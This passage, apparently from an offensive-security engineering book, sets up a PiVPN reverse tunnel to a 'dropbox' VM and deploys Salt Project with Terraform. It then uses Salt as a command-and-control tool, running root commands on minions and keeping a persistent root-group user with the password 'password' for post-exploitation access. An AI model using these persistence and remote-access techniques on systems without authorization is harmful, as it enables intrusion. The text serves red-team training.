:::    -a, add [nopass]   Create a client ovpn profile, optional nopass
:::    -c, clients        List any connected clients to the server
:::    -d, debug          Start a debugging session if having trouble
:::    -l, list           List all valid and revoked certificates
:::    -r, revoke         Revoke a client ovpn profile
:::    -h, help           Show this help dialog
:::    -u, uninstall      Uninstall PIVPN from your system!
:::    -up, update        Updates PiVPN Scripts
:::    -bk, backup        Backup Openvpn and ovpns dir
You’ll need to generate a client certificate for your local Vagrant VM. To do so, run the following command:

$ sudo pivpn add nopass
You’ll be prompted for a name and the amount of time the certificate should last. You can optionally add a passphrase to the certificate for more security, although that’s overkill here. Name the certificate dropbox, which ties back to the topology example from earlier in the chapter and will come up again in a later scenario, and set the expiry days to 1080 (though you could set this value much lower since these are temporary certificates):

Enter a Name for the Client: dropbox
How many days should the certificate last? 1080
Once the client certificate is generated, it will be stored in a newly created ovpns directory within the home folder of your ubuntu user, which you can confirm as follows:

ubuntu@ip-172-31-48-195:~$ ls
opvpns
ubuntu@ip-172-31-48-195:~$ cd ovpns/
ubuntu@ip-172-31-48-195:~/ovpns$ ls
dropbox.ovpn
Now use scp to copy the dropbox.ovpn certificate from the server to your local system, and then move it from the local system to your VM:

username@system:~$ scp -i ~/.ssh/primary-c2-key.pem ubuntu@18.217.171.106:
~/ovpns/dropbox.ovpn .
dropbox.ovpn
This is just one way to copy the certificate from your server to your Vagrant VM; you can do so any way you see fit.

Establishing a Reverse VPN Tunnel
Now you’ll move back to your Vagrant VM and connect to your OpenVPN server. By connecting your Vagrant VM to the VPN, you will be able to authenticate to Vagrant VM remotely via your VPN server. SSH back into the system and then run the following command (replacing --config with the filepath of your config file):

$ sudo openvpn --config dropbox.ovpn
If you set up everything successfully, your VM should now be connecting to the OpenVPN server over the internet. To see the active connection, use the pivpn -c command on your VPN server, which should show this output:

: NOTE : The output below is NOT real time!
:      : It may be off by a few minutes.

::: Client Status List :::
Name      Remote IP          Virtual IP    Bytes Received  Bytes Sent  Connected Since
dropbox   75.62.72.13:63489  10.8.0.2 2.   9KiB            2.6KiB      Apr 18 2025 - 19:36:44
To test whether your connection is working, try pinging the VPN server’s IP addresses:

: NOTE : The output below is NOT real time!
:      : It may be off by a few minutes.

::: Client Status List :::
Name      Remote IP          Virtual IP    Bytes Received  Bytes Sent  Connected Since
dropbox   75.62.72.13:63489  10.8.0.2 2.   9KiB            2.6KiB      Apr 18 2025 - 19:36:44
ubuntu@ip-172-31-40-195:~$ ping 10.8.0.2
PING 10.8.0.2 (10.8.0.2) 56(84) bytes of data.
64 bytes from 10.8.0.2: icmp_seq=1 ttl=64 time=37.8 ms
64 bytes from 10.8.0.2: icmp_seq=1 ttl=64 time=38.0 ms

64 bytes from 10.8.0.2: icmp_seq=1 ttl=64 time=38.0 ms
64 bytes from 10.8.0.2: icmp_seq=1 ttl=64 time=37.8 ms
A successful ping response confirms that Internet Control Message Protocol (ICMP) packets can reach the VPN server. Therefore, the VM is fully connected to your VPN, and you should be able to access the VPN via other protocols.

Now, you should be able to connect via SSH to the virtual IP address (10.8.0.2) by using the default username and password, which are both vagrant. Run the following, and you’ll be prompted to log in with a password:

ubuntu@ip-172-31-48-195:~$ ssh vagrant@10.8.0.2
The authenticity of host '10.8.0.2 (10.8.0.2)' can't be established.
ECDSA key fingerprint is SHA256:mEWYAerSilUSpMn7ynPti7zEMcW0kr6XW/Zxw83tCfk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.8.0.2' (ECDSA) to the list of known hosts.
vagrant@10.8.0.2's password:
And just like that, you’re using your VPN for reverse tunneling! From your client’s perspective, it works just like a regular VPN connection: Its new IP address will be the IP address of your AWS server, through which all traffic will be routed. Your VPN server, however, can now directly access services that are running on your client’s private network, such as SSH (assuming you have the proper credentials, as you would with a dropbox you’ve created).

This means you can access your local system from anywhere as long as you have internet access. Just SSH into your AWS server with your EC2 instance key, then log in to access the local resource through the reverse VPN tunnel.

Summary
This example was designed not only to introduce you to the way a reverse VPN tunnel works in a real-world application but also to give you hands-on experience with the tools you’ll be using in later chapters. You can tear down these services by using terraform destroy and vagrant destroy (or just vagrant down if you want to shut down the VM without deleting it), and when you need them again, you can easily spin them up the same way. Although the VPN configuration steps may have looked a bit lengthy, hopefully you’ve seen that in reality the process takes less than five minutes—nothing compared to the time it would take to manually configure these services from scratch. The speed and easy reproducibility of IaC are huge benefits to consider when you’re developing deployments for your real-world offensive security operations.

To emphasize that point, you now have the ability to quickly stand up VPN infrastructure with little to no effort. VPNs can be used for remote access, network evasion, and more, depending on how you configure them. Automating the deployment of this type of infrastructure instantly allows you to carry out more complex attacks and even configure complex network access for members of your team without actually doing much more than running a script.

7
MANAGING INFRASTRUCTURE FOR OFFENSIVE SECURITY OPERATIONS
The No Starch Press iron logo
Managing offensive security infrastructure requires the same rigor as traditional infrastructure: Systems must be reliable, properly configured, and maintain their state over time. While Terraform excels at initial deployment, maintaining infrastructure throughout offensive security operations requires a different solution. This chapter introduces Salt Project (formerly known as SaltStack), an IaC tool that helps you automate system configuration and enforce desired states across multiple hosts, keeping your infrastructure stable and available during operations.

To help you understand why tools like Salt Project have become essential for infrastructure management, first we need to look at how infrastructure operations have evolved.

The Evolution of Infrastructure Operations
The role of a system administrator has transformed with the advent of cloud technologies and IaC tools such as Terraform, Puppet, Chef, Ansible, and Salt Project. Today, DevOps engineers and platform engineers are essentially the new system administrators, using these IaC technologies to configure and deploy infrastructure for applications and business operations.

Platform security engineers extend the platform engineer role by implementing security controls throughout the IaC pipeline, such as enforcing network security rules, scanning source code for leaked credentials in GitHub repositories, and running automated application security checks. Their goal is both to prevent the deployment of insecure infrastructure and to mitigate any security issues that do arise.

In offensive security, infrastructure skills are equally vital. When emulating threats in red team scenarios (which is discussed in more depth in the next chapter), an offensive security engineer configures server infrastructure and tool kits much like their corporate IT counterparts. Concepts like desired state (introduced in Chapter 4) are just as applicable to an offensive security operation as to normal infrastructure operations. Offensive security infrastructure is just as critical, if not more critical, as normal infrastructure: It needs to be properly configured, secured, and reliable. Thankfully, you can achieve all these goals with IaC automation, as you’ll soon see.

While Terraform has been our primary tool thus far, it maintains state only for infrastructure creation, not for managing the hosts it spins up. If a server’s dependency were deleted, the only way for Terraform to correct that would be to destroy and then re-create the whole server from scratch—not an ideal solution if all you need to do is reinstall a package. This is where other IaC technologies, such as Chef, Puppet, Ansible, and Salt Project, come into play. These technologies enforce IaC automation and desired state configurations across as many hosts as you can configure in your organization, and some can even replace Terraform altogether as a full automation stack for IaC (of course, having one tool handle everything always has pros and cons). In this chapter, you’ll focus on host-based desired state configurations using Salt Project.

Getting Started with Salt Project
Salt Project is an agent-based configuration management tool kit. It works using a master/minion (Salt Project’s terminology) architecture, which simply means client/server. Although it was built for configuration management, you’ll see that it works exactly the same way as the C2 servers you have built and used so far.

Before you set up Salt Project, you will need to configure a few servers. The first server will host the “master” and the remaining servers will run the “minions” that will connect back to the master server.

Configuring the Salt Project Terraform Server
To install Salt Project, you’ll need a few systems. Using the base-saltstack directory in the book’s GitHub repo (https://github.com/3ndG4me/Offensive-Security-Engineering), you can quickly generate everything you will need like so:

user@localhost:~/Offensive-Security-Engineering$ ls base-saltstack/
README.md    adduser    saltmaster.tf    saltminion.tf
All this code is the same as in your IaC from Chapter 6, with two minor differences. First, this script is set up to build three systems instead of one. The primary system will act as the Salt master, while the other two systems will both function as Salt minions to demonstrate how to manage configuration states across multiple systems at once. Second, you’ll be using different listening ports.

The minion servers require only port 22 (SSH) to be open for initial access and Salt minion installation. The master server, however, requires two additional open ports: TCP ports 4505 and 4506. These are the default ports Salt Project listens on to communicate with Salt minions. These port configurations are defined in the Terraform resource groups as follows:

# Put your IP here to whitelist it for ssh.

variable "access_addr" {
  type    = string
  default = "0.0.0.0/0"

}

resource "aws_security_group" "salt_group" {
  name        = "salt_group"
  description = "Allow ports for salt master and ssh access"

  # Open the default Salt port. It's recommended you scope this to internal IP space,
  # but that all depends on the scope of your configuration.
  ingress {
    from_port   = 4505
    to_port     = 4506
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # SSH for remote access, and you might want to lock down to your IP prior to rolling out.
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [var.access_addr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
Once you’re in the base-saltstack directory, preview the changes that will be made as follows:

user@localhost:~/Offensive-Security-Engineering$ terraform plan
Refreshing Terraform state in-memory prior to plan...
The refreshed state will be used to calculate this plan, but will not be
persisted to local or remote state storage.

data.aws_ami.ubuntu: Refreshing state...
data.aws_ami.ubuntu_minion[0]: Refreshing state...
data.aws_ami.ubuntu_minion[1]: Refreshing state...
The initial output shows that three unique Ubuntu systems will be created. This is exactly what you want, so apply the changes like so:

user@localhost:~/Offensive-Security-Engineering$ terraform apply
Plan: 5 to add, 0 to change, 0 to destroy.

Do you want to perform these actions?
    Terraform will perform the actions described above.
    Only 'yes' will be accepted to approve.
    Enter a value: yes

aws_security_group.ssh_group: Creating...
aws_security_group.salt_group: Creating...
aws_security_group.salt_group: Creation complete after 3s [id=sg-060fbff57eb9d187b]
aws_instance.primary_salt: Creating...
aws_security_group.ssh_group: Creation complete after 3s [id=sg-0b5fef568fbe2b066]
aws_instance.secondary_salt[1]: Creating...
aws_instance.secondary_salt[0]: Creating...
aws_instance.primary_salt: Still creating... [10s elapsed]
aws_instance.secondary_salt[1]: Still creating... [10s elapsed]
aws_instance.secondary_salt[0]: Still creating... [10s elapsed]
aws_instance.secondary_salt[1]: Creation complete after 16s [id=i-08347c210bfa2043e]
aws_instance.primary_salt: Still creating... [20s elapsed]
aws_instance.secondary_salt[0]: Still creating... [20s elapsed]
aws_instance.secondary_salt[0]: Creation complete after 22s [id=i-02f04a87d32e7e3c7]
aws_instance.primary_salt: Creation complete after 23s [id=i-0508d2061b811c041]

Apply complete! Resources: 5 added, 0 changed, 0 destroyed.

Outputs:
Minion_One = 3.133.109.114
Minion_Two = 3.15.10.205
Salt_Master = 3.14.144.34
You should see that three IP addresses are returned. In only a few seconds, you have three Ubuntu servers ready to use. You still have some work to do in order to get Salt Project up and running, however.

Installing Salt Project
You’ll start by configuring your Salt master. First, SSH into the Salt_Master server and install the apt repositories’ GNU Privacy Guard (GPG) key:

ubuntu@ip-172-31-2-44:~$ mkdir -p /etc/apt/keyrings
ubuntu@ip-172-31-2-44:~$ curl -fsSL https://packages.broadcom.com/artifactory/api/security/keypair/SaltProjectKey/public | sudo tee /etc/apt/keyrings/salt-archive-keyring.pgp
Next, download the following Salt Project’s salt.sources file and save it to the /etc/apt/sources.list.d/saltstack.list file:

ubuntu@ip-172-31-2-44:~$ curl -fsSL https://github.com/saltstack/salt-install-guide/releases/
latest/download/salt.sources | sudo tee /etc/apt/sources.list.d/salt.sources
Update the apt repositories on the system:

ubuntu@ip-172-31-2-44:~$ sudo apt-get update
Finally, install the Salt master tool:

ubuntu@ip-172-31-2-44:~$ sudo apt-get install salt-master
The installation will automatically start your Salt master services.

NOTE
You can find current instructions in the Salt Project documentation (https://docs.saltproject.io/salt/install-guide/en/latest/topics/install-by-operating-system/linux-deb.html). The Salt Project updates regularly, so the installation process may change slightly over time. Refer to the official documentation for the most up-to-date installation instructions.

To install the Salt minion, repeat the same steps for both of your minion servers, but in the final step, use this command instead:

ubuntu@ip-172-31-2-44:~$ sudo apt-get install salt-minion
The Salt minions require a bit more post-installation configuration than the Salt master.

Configuring the Salt Fingerprint and IP Address
Fingerprints are unique identifiers generated during installation that help with verifying that a given minion is connecting to the correct master. To view the public- and private-key prints, on your Salt master, run the following command:

ubuntu@ip-172-31-2-44:~$ sudo salt-key -F master.*
Local Keys:
master.pem: d2:d8:c0:69:54:05:e6:ef:5b:d2...
master.pub: 7f:93:73:a6:77:41:25:bb:38:47...
Verifying fingerprints isn’t entirely necessary for this example, but it’s a best practice in a production environment; if you don’t take this step, a Salt minion could be intercepted by a rogue Salt master. Salt Project is a privileged tool, and all the minions are running as root, meaning anyone who intercepts this connection could gain root access to the system.

Next, you’ll need to place your master server’s public-key fingerprint (master.pub) and IP address in your minions’ configurations, which live in /etc/salt/minion.

Find the master_ value and enter the fingerprint there:

master_finger: '7f:93:73:a6:77:41:25:bb:38:47...

# Use TLS/SSL encrypted connection between master and minion.
# Can be set to a dictionary containing keyword arguments corresponding to Python's.
# 'ssl.wrap_socket' method.
# Default is None.
# ssl:
#  keyfile: <path_to_keyfile>
#  certfile: <path_to_certfile>
#  ssl_version: PROTOCOL_TLSv1_2

# Grains to be sent to the master on authentication to check if the minion's key
# will be accepted automatically. Needs to be configured on the master.
# autosign_grains:
Then, enter the IP address for the master value, as shown here:

##### Primary configuration settings #####
# This configuration file is used to manage the behavior of the Salt Minion.
# With the exception of the location of the Salt Master Server, values that are
# commented out but have an empty line after the comment are defaults that need
# not be set in the config. If there is no blank line after the comment, the
# value is presented as an example and is not the default.

# Per default the minion will automatically include all config files
# from minion.d/*.conf (minion.d is a directory in the same directory
# as the main minion config file).
# default_include: minion.d/*.conf

# Set the location of the salt master server. If the master server cannot be
# resolved, then the minion will fail to start.
master: 3.14.144.34

# Set http proxy information for the minion when doing requests
# proxy_host:
# proxy_port:
# proxy_username:
# proxy_password:

# List of hosts to bypass HTTP proxy. This key does nothing unless proxy_host etc is
# configured, it does not support any kind of wildcards.
# no_proxy: []
...
Linking the Minions to the Master
Make this change to both minions and then restart the minion as follows:

ubuntu@ip-172-31-2-44:~$ sudo systemctl restart salt-minion
At this point, your minions should have reached out to connect to the Salt master. To confirm, enter the following command:

ubuntu@ip-172-31-2-44:~$ sudo salt-key -L
Accepted Keys:
Denied Keys:
Unaccepted Keys:
ip-172-31-1-191.us-east-2.compute.internal
ip-172-31-4-12.us-east-2.compute.internal
Rejected Keys:
You should see a list of all the unaccepted public keys (two, in this case) from potential minion clients. You can accept the keys one at a time or en masse. To do the latter, enter the following command, typing y when asked to confirm:

ubuntu@ip-172-31-2-44:~$ sudo salt-key -A
The following keys are going to be accepted:
Unaccepted Keys:
ip-172-31-1-191.us-east-2.compute.internal
ip-172-31-4-12.us-east-2.compute.internal
Proceed [n/Y] y
Key for minion ip-172-31-1-191.us-east-2.compute.internal accepted
Key for minion ip-172-31-4-12.us-east-2.compute.internal accepted
Once you have confirmed, both keys are successfully accepted, fully linking both minions to the master. To confirm, run this command again:

ubuntu@ip-172-31-2-44:~$ sudo salt-key -L
Accepted Keys:
ip-172-31-1-191.us-east-2.compute.internal
ip-172-31-4-12.us-east-2.compute.internal
Denied Keys:
Unaccepted Keys:
Rejected Keys:
You now have full command and control over these systems from your Salt master.

Running a Salt Project Command
To run a command via the salt tool, use the cmd.run argument as follows:

ubuntu@ip-172-31-2-44:~$ sudo salt '*' cmd.run 'id'
ip-172-31-1-191.us-east-2.compute.internal:
    uid=0(root) gid=0(root) groups=0(root)
ip-172-31-4-12.us-east-2.compute.internal:
    uid=0(root) gid=0(root) groups=0(root)
First, the filter * tells Salt which systems you want to run the command on (in this case, all minions). Filtering is important when you have Salt minions across multiple operating systems, since some commands are compatible only with Windows or with Linux. Salt also works with Windows configuration management, so you can use filters to target specific operating systems, tags, or names that match certain patterns. This filtering also works for applying configuration states. For example, you could add a service account to Windows systems but ignore your Linux systems.

Next, you provide a command as an argument to cmd.run. In this case, running id returns output that is eerily similar to a C2.

Working with Salt States
Now that you have your Salt master and minions configured, you’re ready to dive a little deeper into the concept of desired state. Salt Project uses YAML as its default declarative language to define its Salt states.

Salt states are stored in .sls files. Each state begins with an identifier, followed by a function name and the various properties and arguments to enforce:

identifier:
  module.function:
    - name: name_value
    - function_arg: arg_value
    - function_arg: arg_value
    - function_arg: arg_value
Since states define how the configuration should be rather than actually configuring it, the syntax is declarative, not conditional (although a state can detect whether something exists). For more information about states, see the Salt Project documentation (https://docs.saltproject.io/salt/user-guide/en/latest/topics/states.html).

Creating a Salt State
You’ll build an example state called Add nix User that ensures a specific user exists on the Linux minions you specify. If that user does not already exist, Salt will create it; if the user is ever removed, Salt will re-create it. This is the essence of desired state, maintaining a specified configuration over time:

Add nix User:
  user.present:
    - name: gretchen
    - password: password
    - hash_password: True
    - home: /home/gretchen
    - optional_groups:
      - wheel
      - sudoers
      - root
You may have noticed that this state defines a plaintext password of password. This seems insecure, but keep in mind that only users with root privileges on the Salt master can read these files, meaning your access level is already higher than the password would grant you. In addition, if you have root access to the Salt Project servers, you don’t need credentials anymore as you can directly access all the minions via the salt command (this is similar to having domain administrator access in an Active Directory environment). That said, cleartext credentials present another opportunity: reuse. If the platform engineers didn’t follow a credential reuse policy, this password could get you into systems beyond Salt Project. Thus, to prevent unauthorized access and storage of cleartext credentials in the server’s filesystem, Salt Project provides pillars, encrypted structures that only Salt Project can access. Pillars are beyond the scope of this book, but you should be aware of them.

There are a lot of ways to configure your state files for Salt Project to use. Salt Project will look for states in the directory /srv/salt by default, but you’ll need to create it first. While you can start adding your .sls files directly, organizing them into modules is good practice. For each state type, you’ll create a subdirectory with a file called init.sls inside it, as shown here for the adduser state:

ubuntu@ip-172-31-2-44:~$ cd /srv
ubuntu@ip-172-31-2-44:/srv$ sudo mkdir salt
ubuntu@ip-172-31-2-44:/srv/salt$ cd salt/
ubuntu@ip-172-31-2-44:/srv/salt$ sudo mkdir adduser
ubuntu@ip-172-31-2-44:/srv/salt/adduser$ cd adduser/
ubuntu@ip-172-31-2-44:/srv/salt/adduser$ sudo touch init.sls
After creating /srv/salt/adduser/init.sls, paste the YAML configuration code for Add nix User inside it.

Next, you create the top.sls file, which defines your state file directory structure as well as which states should run on which machines based on the filters described previously:

ubuntu@ip-172-31-2-44:/srv/salt/adduser$ cd ..
ubuntu@ip-172-31-2-44:/srv/salt/$ sudo touch top.sls
While you can manually apply states to systems, predefining state in top.sls allows for automated desired state configuration. This file is also where you can define additional file_roots if you wish to store state files somewhere other than /srv/salt. This top.sls file lives in the root of /srv/salt in /srv/salt/top.sls:

file_roots:
  base:
    - /srv/salt
base:
  '*':
    - adduser
Just like Terraform, Salt Project allows you to plan or preview your state’s action before execution. To execute a state apply command in test mode, pass it a test=true argument as follows:

ubuntu@ip-172-31-2-44:~$ sudo salt '*' state.apply test=true
ID: Add nix User
Function: user.present
Name: gretchen
Result: None
Comment: User gretchen set to be added
Started: 19:01:46.697434
Duration: 29.136 ms
Changes:
Observing Desired State
The output below shows that you’ll have two changes in state, one for each minion host where the gretchen user will be added. Now you’ll run sudo salt state.apply without the test=true flag to execute the state and confirm that the gretchen user is present across all systems:

ubuntu@ip-172-31-2-44:~$ sudo salt '*' state.apply
Changes:
Summary for ip-172-31-4-12.us-east-2.compute.internal
-----------
Succeeded: 1 (unchanged=1)
Failed: 0
-----------
Total states run: 1
Total run time: 29.136 ms
ip-172-31-1-191.us-east-2.compute.internal:
-----------

  Function: user.present
  Name: gretchen
  Result: None
  Comment: User gretchen set to be added
  Started: 19:01:46.682693
  Duration: 28.706 ms
  Changes:

Summary for ip-172-31-1-191.us-east-2.compute.internal
------------
Succeeded: 1 (unchanged=1)

Total run time: 28.706 ms

  --------

This output shows that you have two changes in state, one for each minion host where the gretchen user will be added. Log in to one of your minions via SSH to confirm that this user was added by checking the /etc/passwd file:

ubuntu@ip-172-31-2-44:~$ cat /etc/passwd
...
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gretchen:x:1001:1001::/home/gretchen:/bin/sh
ubuntu@ip-172-31-2-44:~$
Now try logging in as your new user:

ubuntu@ip-172-31-2-44:~$ sudo su gretchen
$ whoami
gretchen
$ id
uid=1001(gretchen) gid=1001(gretchen) groups=1001(gretchen),0(root)
You can see that you are successfully dropped into a new shell, and you have the privileges that you told your Salt state to assign to the gretchen user.

Now what happens if you delete this user? Your configurations are managed by Salt Project, so will it either prevent the deletion, or allow the deletion but restore the user automatically? The answer to both questions is no: No real-time monitoring is in place that prevents you from making changes to anything on the system, and by default Salt Project won’t automatically restore them. While you could configure an automated job to periodically reapply states to all Salt minions and strictly enforce desired state, doing so could cause issues. Realistically, if you’re managing configurations on a given system via Salt Project, you shouldn’t be making manual changes or you’ll cause discrepancies in your desired state and overall configuration. Instead, test the changes via Salt Project and build a state when you have it set up correctly. Once you test your state, the next step is to have the state ultimately manage the change going forward.

To see this in action, delete the gretchen user like so:

ubuntu@ip-172-31-2-44:~ $ sudo deluser gretchen
Removing user 'gretchen' ...
Warning: group 'gretchen' has no more members.
Done.
ubuntu@ip-172-31-2-44:~$ cat /etc/passwd
...
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
ubuntu@ip-172-31-2-44:~$
Once the gretchen user is deleted from your minion system, it is permanently deleted, and you can no longer log in to it:

ubuntu@ip-172-31-2-44:~ $ sudo su gretchen
No passwd entry for user 'gretchen'
Move back over to your Salt master system and run another state.apply with the test flag; this time, you’ll see that only one change needs to be made. Salt Project has detected that the gretchen user exists on one minion but not on the other and will enforce the desired state by creating the user. Running a full apply again will restore gretchen on the impacted system:

ID: Add nix User
  Function: user.present
  Name: gretchen
  Result: None
  Comment: User gretchen set to be added
  Started: 19:03:21.134908

----------------

  Total run time:   24.832 ms

----------------

    Function: user.present

    Started: 19:03:21.133944

    Changes:

...

ubuntu@ip-172-31-2-44:~$ cat /etc/passwd
...
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin

landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gretchen:x:1001:1001::/home/gretchen:/bin/sh
ubuntu@ip-172-31-2-44:~$
Just like that, Salt Project has corrected the configuration on your system to maintain the desired state you set up. While you could use other tools to do this just as effectively, Salt Project is more interesting from an offensive security perspective because of its C2-like nature.

Salt Project as a C2 Server
In fact, you could repurpose Salt Project as a C2 server where the desired state configurations serve as your post-exploitation scripts. Dan Borges (aka “ahhh”) has written scripts for the Gscript project that automate Salt minion installation as a post-exploitation technique (https://github.com/ahhh/gscripts). Once the minions are installed, you can deploy your own state files for persistence or other post-exploitation techniques. Adding a user as you did in this example is a simple way to gain root access so that you could get back into a system if you were kicked off during an assessment.

Is Salt Project a C2 for offensive security? It most certainly can be, but that was not its intended use case—another example illustrating that malware is just software. What you do with it is limited only by your creativity as an attacker.

Summary
Salt Project is one of many tools that showcase the effectiveness of managing systems with automation. The implementation of desired state in conjunction with automation provides great efficiency to both infrastructure admins and attackers alike. As an attacker, you should continue to consider Salt Project’s use not only as an unintended C2 tool but also as a prime target to attempt exploitation if identified during an engagement.

Red Team Engineering
PART III: OFFENSIVE SECURITY IN THE REAL WORLD
